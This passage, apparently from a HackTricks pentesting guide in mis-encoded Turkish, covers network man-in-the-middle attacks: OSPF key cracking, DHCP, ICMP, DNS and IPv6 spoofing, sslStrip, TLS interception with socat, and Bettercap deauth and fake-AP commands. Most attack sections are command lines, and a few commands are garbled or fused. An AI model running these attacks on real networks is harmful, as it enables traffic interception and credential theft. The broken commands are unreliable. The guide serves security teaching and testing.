Open Shortest Path First (OSPF) protokolÃ¼nde, gÃ¼venli iletiÅŸimi saÄŸlamak iÃ§in genellikle MD5 kimlik doÄŸrulamasÄ± kullanÄ±lÄ±r. Bununla birlikte, Loki ve John the Ripper gibi araÃ§lar kullanÄ±larak bu gÃ¼venlik Ã¶nlemi tehlikeye atÄ±labilir. Bu araÃ§lar, MD5 karma deÄŸerlerini yakalayÄ±p kÄ±rabilme yeteneÄŸine sahiptir ve kimlik doÄŸrulama anahtarÄ±nÄ± ortaya Ã§Ä±karÄ±r. Bu anahtar elde edildikten sonra, yeni yÃ¶nlendirme bilgileri tanÄ±tÄ±labilir. Rota parametrelerini yapÄ±landÄ±rmak ve tehlikeye atÄ±lan anahtarÄ± kurmak iÃ§in sÄ±rasÄ±yla _Injection_ ve _Connection_ sekmeleri kullanÄ±lÄ±r.

- **MD5 Karma DeÄŸerlerini Yakalama ve KÄ±rma:** Loki ve John the Ripper gibi araÃ§lar bu amaÃ§la kullanÄ±lÄ±r.
- **Rota Parametrelerini YapÄ±landÄ±rma:** Bu, _Injection_ sekmesi aracÄ±lÄ±ÄŸÄ±yla yapÄ±lÄ±r.
- **Tehlikeye AtÄ±lan AnahtarÄ± Ayarlama:** Anahtar, _Connection_ sekmesi altÄ±nda yapÄ±landÄ±rÄ±lÄ±r.

### DiÄŸer Genel AraÃ§lar ve Kaynaklar

* [**Above**](https://github.com/c4s73r/Above): AÄŸ trafiÄŸini taramak ve zayÄ±flÄ±klarÄ± bulmak iÃ§in kullanÄ±lan bir araÃ§
* AÄŸ saldÄ±rÄ±larÄ± hakkÄ±nda daha fazla bilgiye [buradan](https://github.com/Sab0tag3d/MITM-cheatsheet) ulaÅŸabilirsiniz.

## **Spoofing**

SaldÄ±rgan, sahte DHCP yanÄ±tlarÄ± gÃ¶ndererek yeni aÄŸ Ã¼yesinin tÃ¼m aÄŸ parametrelerini (GW, IP, DNS) yapÄ±landÄ±rÄ±r.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

[Ã–nceki bÃ¶lÃ¼me](./#arp-spoofing) bakÄ±n.

### ICMPRedirect

ICMP YÃ¶nlendirme, saldÄ±rganÄ±n bir IP'ye ulaÅŸmanÄ±n en iyi yolunun kendisi olduÄŸunu belirten bir ICMP paketi tÃ¼rÃ¼ 1 kod 5 gÃ¶ndererek gerÃ§ekleÅŸtirilir. ArdÄ±ndan, kurban IP'ye ulaÅŸmak istediÄŸinde, paketi saldÄ±rgan Ã¼zerinden gÃ¶nderir.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS SahtekarlÄ±ÄŸÄ±

SaldÄ±rgan, kurbanÄ±n talep ettiÄŸi bazÄ± (veya tÃ¼m) alan adlarÄ±nÄ± Ã§Ã¶zecektir.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**dnsmasq ile Kendi DNS'inizi YapÄ±landÄ±rma**

Bu yÃ¶ntem, dnsmasq adlÄ± bir araÃ§ kullanarak kendi DNS sunucunuzu yapÄ±landÄ±rmanÄ±za olanak tanÄ±r. Dnsmasq, DNS sorgularÄ±nÄ± yÃ¶nlendirmek ve DNS kayÄ±tlarÄ±nÄ± Ã¶nbelleÄŸe almak iÃ§in kullanÄ±lan bir hizmettir.

1. Ä°lk olarak, dnsmasq'Ä± yÃ¼klemek iÃ§in aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rÄ±n:

   ```
   sudo apt-get install dnsmasq
   ```

2. Dnsmasq'Ä± yapÄ±landÄ±rmak iÃ§in `/etc/dnsmasq.conf` dosyasÄ±nÄ± dÃ¼zenleyin:

   ```
   sudo nano /etc/dnsmasq.conf
   ```

3. DosyanÄ±n iÃ§inde aÅŸaÄŸÄ±daki satÄ±rlarÄ± ekleyin:

   ```
   listen-address=127.0.0.1
   bind-interfaces
   address=/example.com/192.168.1.100
   ```

   YukarÄ±daki Ã¶rnekte, `example.com` alan adÄ± `192.168.1.100` IP adresine yÃ¶nlendirilir.

4. Dnsmasq'Ä± yeniden baÅŸlatmak iÃ§in aÅŸaÄŸÄ±daki komutu Ã§alÄ±ÅŸtÄ±rÄ±n:

   ```
   sudo systemctl restart dnsmasq
   ```

5. Åimdi, DNS ayarlarÄ±nÄ±zÄ± deÄŸiÅŸtirmek iÃ§in `/etc/resolv.conf` dosyasÄ±nÄ± dÃ¼zenleyin:

   ```
   sudo nano /etc/resolv.conf
   ```

6. DosyanÄ±n iÃ§inde aÅŸaÄŸÄ±daki satÄ±rÄ± ekleyin:

   ```
   nameserver 127.0.0.1
   ```

   Bu, DNS sorgularÄ±nÄ± yerel dnsmasq sunucusuna yÃ¶nlendirecektir.

ArtÄ±k dnsmasq ile kendi DNS sunucunuz yapÄ±landÄ±rÄ±lmÄ±ÅŸtÄ±r. Bu sayede DNS sorgularÄ±nÄ±zÄ± Ã¶zelleÅŸtirebilir ve yÃ¶nlendirebilirsiniz.
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Yerel AÄŸ GeÃ§itleri

Sistemlere ve aÄŸlara birden fazla rota genellikle mevcuttur. Yerel aÄŸdaki MAC adreslerinin bir listesini oluÅŸturduktan sonra, IPv4 yÃ¶nlendirmesini destekleyen ana bilgisayarlarÄ± belirlemek iÃ§in _gateway-finder.py_ kullanÄ±n.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [LLMNR, NBT-NS ve mDNS SahteciliÄŸi](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Microsoft sistemleri, DNS sorgularÄ± baÅŸarÄ±sÄ±z olduÄŸunda yerel ana bilgisayar Ã§Ã¶zÃ¼mlemesi iÃ§in **Link-Local Multicast Name Resolution (LLMNR)** ve **NetBIOS Name Service (NBT-NS)**'ye gÃ¼venir. Benzer ÅŸekilde, **Apple Bonjour** ve **Linux sÄ±fÄ±r yapÄ±landÄ±rma** uygulamalarÄ±, bir aÄŸ iÃ§indeki sistemleri keÅŸfetmek iÃ§in **Multicast DNS (mDNS)** kullanÄ±r. Bu protokollerin kimlik doÄŸrulama yapÄ±lmadan Ã§alÄ±ÅŸmasÄ± ve UDP Ã¼zerinden yayÄ±nlanan mesajlarla iÅŸlemesi nedeniyle, saldÄ±rganlar kullanÄ±cÄ±larÄ± kÃ¶tÃ¼ niyetli hizmetlere yÃ¶nlendirmek iÃ§in bunlarÄ± istismar edebilir.

Responder kullanarak, ana bilgisayarlarÄ±n aradÄ±ÄŸÄ± hizmetleri taklit edebilir ve sahte yanÄ±tlar gÃ¶ndererek saldÄ±rÄ± yapabilirsiniz.\
[Responder ile hizmetleri taklit etme hakkÄ±nda daha fazla bilgi iÃ§in burayÄ±](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) okuyun.

### [WPAD SahteciliÄŸi](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

TarayÄ±cÄ±lar genellikle **Web Proxy Auto-Discovery (WPAD) protokolÃ¼nÃ¼ otomatik olarak proxy ayarlarÄ±nÄ± almak iÃ§in** kullanÄ±r. Bu, Ã¶zellikle "http://wpad.example.org/wpad.dat" gibi bir URL aracÄ±lÄ±ÄŸÄ±yla yapÄ±landÄ±rma ayrÄ±ntÄ±larÄ±nÄ± bir sunucudan almayÄ± iÃ§erir. Ä°stemcilerin bu sunucuyu keÅŸfetmesi Ã§eÅŸitli mekanizmalar aracÄ±lÄ±ÄŸÄ±yla gerÃ§ekleÅŸebilir:

- **DHCP** aracÄ±lÄ±ÄŸÄ±yla, keÅŸif Ã¶zel bir kod 252 giriÅŸi kullanÄ±larak kolaylaÅŸtÄ±rÄ±lÄ±r.
- **DNS** ile, yerel etki alanÄ±nda _wpad_ olarak etiketlenmiÅŸ bir ana bilgisayar adÄ± aranarak gerÃ§ekleÅŸtirilir.
- **Microsoft LLMNR ve NBT-NS** aracÄ±lÄ±ÄŸÄ±yla, DNS sorgularÄ±nÄ±n baÅŸarÄ±sÄ±z olduÄŸu durumlarda kullanÄ±lan yedek mekanizmalarla.

Responder aracÄ±, **zararlÄ± bir WPAD sunucusu** olarak bu protokolden faydalanÄ±r. DHCP, DNS, LLMNR ve NBT-NS kullanarak istemcileri yanÄ±ltarak onlarÄ±n kendisine baÄŸlanmasÄ±nÄ± saÄŸlar. Responder kullanarak hizmetlerin nasÄ±l taklit edilebileceÄŸine daha detaylÄ± bir ÅŸekilde bakmak iÃ§in [burayÄ± kontrol edin](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).


### [SSDP ve UPnP CihazlarÄ±nÄ±n SahteciliÄŸi](spoofing-ssdp-and-upnp-devices.md)

AÄŸda farklÄ± hizmetler sunarak bir kullanÄ±cÄ±yÄ± kandÄ±rmak ve bazÄ± dÃ¼z metin kimlik bilgilerini girmesini saÄŸlamak mÃ¼mkÃ¼ndÃ¼r. **Bu saldÄ±rÄ± hakkÄ±nda daha fazla bilgi iÃ§in** [**SSDP ve UPnP CihazlarÄ±nÄ±n SahteciliÄŸi**](spoofing-ssdp-and-upnp-devices.md)**'ne** bakÄ±n.

### IPv6 KomÅŸu SahteciliÄŸi

Bu saldÄ±rÄ±, ARP SahteciliÄŸi ile IPv6 dÃ¼nyasÄ±nda Ã§ok benzerdir. KurbanÄ±, saldÄ±rganÄ±n MAC adresine sahip olduÄŸunu dÃ¼ÅŸÃ¼ndÃ¼rebilirsiniz.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 YÃ¶nlendirici Ä°lanÄ± Sahteleme/Sel Basma

BazÄ± iÅŸletim sistemleri, aÄŸda gÃ¶nderilen RA paketlerinden varsayÄ±lan olarak aÄŸ geÃ§idini yapÄ±landÄ±rÄ±r. SaldÄ±rganÄ± IPv6 yÃ¶nlendirici olarak bildirmek iÃ§in ÅŸunlarÄ± kullanabilirsiniz:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP spoofing

VarsayÄ±lan olarak, bazÄ± iÅŸletim sistemleri aÄŸÄ±ndaki bir DHCPv6 paketini okuyarak DNS'i yapÄ±landÄ±rmaya Ã§alÄ±ÅŸÄ±r. ArdÄ±ndan, saldÄ±rgan kendisini DNS olarak yapÄ±landÄ±rmak iÃ§in bir DHCPv6 paketi gÃ¶nderebilir. DHCP ayrÄ±ca kurban iÃ§in bir IPv6 saÄŸlar.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (sahte sayfa ve JS kodu enjeksiyonu)

## Ä°nternet SaldÄ±rÄ±larÄ±

### sslStrip

Bu saldÄ±rÄ±nÄ±n temel olarak yaptÄ±ÄŸÄ± ÅŸey, **kullanÄ±cÄ±nÄ±n** **eriÅŸmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±** bir **HTTP** sayfasÄ±nÄ±n **HTTPS** sÃ¼rÃ¼mÃ¼ne **yÃ¶nlendirme** yaptÄ±ÄŸÄ± durumlarda, **sslStrip** **istemciyle** bir **HTTP baÄŸlantÄ±sÄ±** ve **sunucuyla** bir **HTTPS baÄŸlantÄ±sÄ±** kurarak baÄŸlantÄ±yÄ± **dÃ¼z metin** olarak **dinleyebilir** hale getirmektir.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Daha fazla bilgi iÃ§in [buraya](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf) bakabilirsiniz.

### HSTS'yi atlatmak iÃ§in sslStrip+ ve dns2proxy

**sslStrip+ ve dns2proxy**'nin **sslStrip**'e karÅŸÄ± **farkÄ±**, Ã¶rneÄŸin _**www.facebook.com**_'u _**wwww.facebook.com**_ (ekstra "**w**" dikkat edin) olarak **yÃ¶nlendirecek** ve bu alanÄ±n **saldÄ±rgan IP'sini ayarlayacak** olmasÄ±dÄ±r. Bu ÅŸekilde, **istemci**, _**wwww.facebook.com**_ (saldÄ±rgan) ile baÄŸlantÄ± kuracak, ancak arka planda **sslstrip+**, **www.facebook.com** ile https Ã¼zerinden gerÃ§ek baÄŸlantÄ±yÄ± sÃ¼rdÃ¼recektir.

Bu teknikteki **amaÃ§**, tarayÄ±cÄ±nÄ±n Ã¶nbelleÄŸine _**wwww**.facebook.com_ kaydedilmeyeceÄŸi iÃ§in HSTS'yi **atlamaktÄ±r**, bÃ¶ylece tarayÄ±cÄ± **facebook kimlik doÄŸrulamasÄ±nÄ± HTTP Ã¼zerinden gerÃ§ekleÅŸtirmeye kandÄ±rÄ±lÄ±r**.\
Bu saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek iÃ§in kurbanÄ±n baÅŸlangÄ±Ã§ta [http://www.faceook.com](http://www.faceook.com) adresine eriÅŸmeye Ã§alÄ±ÅŸmasÄ± gerekmektedir. Bu, bir http sayfasÄ±ndaki baÄŸlantÄ±larÄ± deÄŸiÅŸtirerek yapÄ±labilir.

Daha fazla bilgi iÃ§in [buraya](https://www.bettercap.org/legacy/#hsts-bypass), [buraya](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) ve [buraya](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly) bakabilirsiniz.

**sslStrip veya sslStrip+ artÄ±k Ã§alÄ±ÅŸmÄ±yor. Bunun nedeni tarayÄ±cÄ±larda Ã¶nceden kaydedilmiÅŸ HSTS kurallarÄ±nÄ±n bulunmasÄ±dÄ±r, bu yÃ¼zden bir kullanÄ±cÄ±nÄ±n bir "Ã¶nemli" alan adÄ±na ilk kez eriÅŸmesi bile HTTPS Ã¼zerinden gerÃ§ekleÅŸir. AyrÄ±ca, Ã¶nceden kaydedilmiÅŸ kurallar ve diÄŸer oluÅŸturulan kurallar** [**`includeSubdomains`**](https://hstspreload.appspot.com) **bayraÄŸÄ±nÄ± kullanabilir, bu nedenle Ã¶nceki Ã¶rnekteki** _**wwww.facebook.com**_ **artÄ±k Ã§alÄ±ÅŸmayacaktÄ±r Ã§Ã¼nkÃ¼** _**facebook.com**_ **`includeSubdomains` ile HSTS kullanÄ±r.**

TODO: easy-creds, evilgrade, metasploit, factory

## Portta TCP dinleme
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL dinleme portu

#### AnahtarlarÄ± ve Ã¶z-imzalÄ± sertifikayÄ± oluÅŸturun

```bash
openssl genrsa -out private.key 2048
openssl req -new -x509 -key private.key -out certificate.crt -days 365
```

#### Start the listener

```bash
openssl s_server -key private.key -cert certificate.crt -accept <port> -www
```

#### Connect to the listener

```bash
openssl s_client -connect <ip>:<port>
```
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Sertifika kullanarak dinleme

Bu yÃ¶ntem, aÄŸ trafiÄŸini dinlemek iÃ§in bir sertifika kullanmayÄ± iÃ§erir. Bu, aÄŸdaki verileri ÅŸifrelemek iÃ§in kullanÄ±lan SSL/TLS protokolÃ¼nÃ¼ etkisiz hale getirir ve saldÄ±rganÄ±n trafiÄŸi dinlemesine olanak tanÄ±r.

Bu yÃ¶ntemi uygulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Bir sertifika oluÅŸturun veya bir sertifika satÄ±n alÄ±n.
2. SertifikayÄ± hedef aÄŸa yÃ¼kleyin.
3. SertifikayÄ± kullanarak bir saldÄ±rÄ± sunucusu oluÅŸturun.
4. Hedef aÄŸa baÄŸlanan istemcilerin trafiÄŸini dinlemek iÃ§in saldÄ±rÄ± sunucusunu kullanÄ±n.

Bu yÃ¶ntem, aÄŸ trafiÄŸini dinlemek iÃ§in etkili bir yol saÄŸlar, ancak yasal ve etik sÄ±nÄ±rlamalarÄ± aÅŸabileceÄŸi iÃ§in dikkatli bir ÅŸekilde kullanÄ±lmalÄ±dÄ±r.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Sertifika kullanarak dinle ve ana bilgisayarlara yÃ¶nlendir

Bu yÃ¶ntemde, hedef aÄŸa sÄ±zabilmek iÃ§in bir sertifika kullanarak dinleme yapÄ±lÄ±r ve ardÄ±ndan trafiÄŸi hedef ana bilgisayarlara yÃ¶nlendirilir. Bu, aÄŸdaki verileri ele geÃ§irmek ve hedef sistemlere eriÅŸim saÄŸlamak iÃ§in kullanÄ±lan bir tekniktir.

Bu yÃ¶ntemi uygulamak iÃ§in aÅŸaÄŸÄ±daki adÄ±mlarÄ± izleyebilirsiniz:

1. Bir sertifika oluÅŸturun ve hedef aÄŸa yÃ¼kleyin.
2. Dinleme yapmak iÃ§in bir araÃ§ kullanÄ±n ve sertifikayÄ± kullanarak trafiÄŸi dinleyin.
3. Dinlenen trafiÄŸi hedef ana bilgisayarlara yÃ¶nlendirin.
4. Hedef sistemlere eriÅŸim saÄŸlamak iÃ§in dinlenen verileri analiz edin ve uygun saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirin.

Bu yÃ¶ntem, aÄŸ gÃ¼venliÄŸi zafiyetlerini tespit etmek ve aÄŸa sÄ±zma giriÅŸimlerini test etmek iÃ§in kullanÄ±lan bir pentesting tekniÄŸidir. Ancak, bu tÃ¼r bir saldÄ±rÄ±yÄ± gerÃ§ekleÅŸtirmek yasa dÄ±ÅŸÄ±dÄ±r ve yalnÄ±zca yasal izinlerle ve etik kurallara uygun olarak gerÃ§ekleÅŸtirilmelidir.
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Bazen istemci CA'nÄ±n geÃ§erli olduÄŸunu kontrol ederse, **baÅŸka bir ana adÄ± tarafÄ±ndan imzalanan bir CA sertifikasÄ± sunabilirsiniz**.\
BaÅŸka bir ilginÃ§ test, **istemci tarafÄ±ndan istenen ana adÄ±nÄ±n kendine imzalÄ± bir sertifikasÄ± sunmaktÄ±r**.

Denemek iÃ§in baÅŸka ÅŸeyler de var, geÃ§erli bir CA olmayan geÃ§erli bir sertifika ile sertifikayÄ± imzalamayÄ± deneyebilirsiniz. Veya geÃ§erli genel anahtarÄ± kullanarak, gerÃ§ek Ã¶zel anahtarla hiÃ§bir ÅŸeyi ÅŸifrelemeye gerek olmayan bir algoritma kullanmayÄ± zorlayabilir ve istemci gerÃ§ek Ã¶zel anahtarÄ±n bir sondajÄ±nÄ± (Ã¶rneÄŸin bir karma) istediÄŸinde sahte bir sondaj gÃ¶nderip istemcinin bunu kontrol etmediÄŸini umabilirsiniz.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktif KeÅŸif NotlarÄ±

Bir UDP paketi, istenen baÄŸlantÄ± noktasÄ±na sahip olmayan bir cihaza gÃ¶nderildiÄŸinde, bir ICMP (Port UlaÅŸÄ±lamaz) paketi gÃ¶nderilir.

### **ARP KeÅŸfi**

ARP paketleri, aÄŸ iÃ§inde hangi IP adreslerinin kullanÄ±ldÄ±ÄŸÄ±nÄ± keÅŸfetmek iÃ§in kullanÄ±lÄ±r. Bilgisayar her olasÄ± IP adresi iÃ§in bir istek gÃ¶ndermeli ve yalnÄ±zca kullanÄ±lan IP adresleri yanÄ±t verecektir.

### **mDNS (Ã§oklu DNS)**

Bettercap, **\_services\_.dns-sd.\_udp.local** iÃ§in bir MDNS isteÄŸi gÃ¶nderir (her X ms). Bu paketi gÃ¶ren makine genellikle bu isteÄŸi yanÄ±tlar. ArdÄ±ndan, yalnÄ±zca "hizmetlere" yanÄ±t veren makineler aranÄ±r.

**AraÃ§lar**

* Avahi-browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Ad Sunucusu)**

Bettercap, isim "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA" iÃ§in 137/UDP baÄŸlantÄ± noktasÄ±na yayÄ±n yapar.

### **SSDP (Basit Hizmet KeÅŸif ProtokolÃ¼)**

Bettercap, tÃ¼m tÃ¼rdeki hizmetleri aramak iÃ§in SSDP paketlerini yayÄ±nlar (UDP BaÄŸlantÄ± NoktasÄ± 1900).

### **WSD (Web Hizmeti KeÅŸfi)**

Bettercap, hizmetleri aramak iÃ§in WSD paketlerini yayÄ±nlar (UDP BaÄŸlantÄ± NoktasÄ± 3702).

## Referanslar

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3. baskÄ±)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. By Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug bounty ipucu**: **Intigriti'ye kaydolun**, hackerlar tarafÄ±ndan oluÅŸturulan bir premium **bug bounty platformu**! BugÃ¼n [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) adresine katÄ±lÄ±n ve **100.000 $'a kadar Ã¶dÃ¼ller kazanmaya baÅŸlayÄ±n**!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> ile sÄ±fÄ±rdan kahraman olmak iÃ§in AWS hackleme Ã¶ÄŸrenin<strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* Åirketinizi HackTricks'te **reklam vermek** veya HackTricks'i **PDF olarak indirmek** iÃ§in [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* Ã–zel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluÅŸan koleksiyonumuz [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keÅŸfedin
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da takip edin ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live).
* Hacking hilelerinizi gÃ¶ndererek HackTricks ve HackTricks Cloud github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>
